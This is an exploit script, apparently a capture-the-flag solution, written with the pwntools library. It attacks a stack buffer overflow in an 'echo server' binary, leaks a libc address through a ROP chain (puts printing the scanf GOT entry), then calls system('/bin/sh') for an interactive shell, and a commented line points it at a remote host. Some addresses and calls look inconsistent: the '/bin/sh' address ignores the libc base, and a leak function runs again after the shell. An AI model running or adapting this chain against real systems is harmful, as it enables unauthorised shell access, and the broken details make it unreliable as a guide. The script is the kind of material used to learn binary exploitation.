from pwn import *
import argparse

parser = argparse.ArgumentParser(
      prog='exploit_libc',
      formatter_class=argparse.RawDescriptionHelpFormatter,
      epilog='''\
         This program finds the address of libc.so.6 in the running binary
         and uses it, along with a "pop RDI" instruction in order to get a shell.
         '''
)
parser.add_argument("-f",
                    "--filename",
                    type=str,
                    help="name of the executable file that you want to find the offset of",
                    required=True)
parser.add_argument("-p",
                    "--payload-size",
                    type=int,
                    help="size of the payload to use to find the offset (must be enough to cause a segmentation fault in the program)",
                    required=True)
args = parser.parse_args()

def find_rip_offset():
    """
    Finds the offset in a buffer overflow on a 64-bit system to the RSP pointer.

    :param payload_size: (int) the size of payload to use while finding the RIP (must be enough to cause a segmentation fault)
    :return: (int) the offset to the RSP
    """
    p = process(args.filename)
    p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', cyclic(args.payload_size))

    p.wait()
    rsp_offset = cyclic_find(p.corefile.read(p.corefile.rsp, 4))
    info("RIP offset is {}".format(rsp_offset))

    p.kill()
    return rsp_offset
    
def get_libc_base_addr():
	
	pop_rdi = 0x400913
	scanf_at_got = 0x601038
	puts_at_plt = 0x400540
	back_to_main = 0x400771
	
	payload = junk + p64(pop_rdi) + p64(scanf_at_got) + p64(puts_at_plt) + p64(back_to_main)
	p.sendline(payload)
	
	p.recvline()
	p.recvline()
	leak = u64(p.recvline().strip().ljust(8,b"\x00"))
	
	log.info(f"scanf leaked address is {hex(leak)}")
	

	
	scanf_offset = 0x7bf30
	log.info(f"Libc address is {hex(leak - scanf_offset)}")
	return leak - scanf_offset
	
	
	
	
def send_payload():
	system_addr = base_addr_libc + 0x1b40fa
	bin_sh_addr = 0x2b40fa
	pop_rdi = 0x400913
	ret_addr = 0x40052e
	
	
	payload = junk + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr) 
	p.sendline(payload)
	p.interactive()
	

offset = find_rip_offset()
junk = offset * b'A'

p = process(args.filename)
#p = remote("args.domain_name", args.port)
#gdb.attach(p)

base_addr_libc = get_libc_base_addr()
send_payload()

get_libc_base_addr()

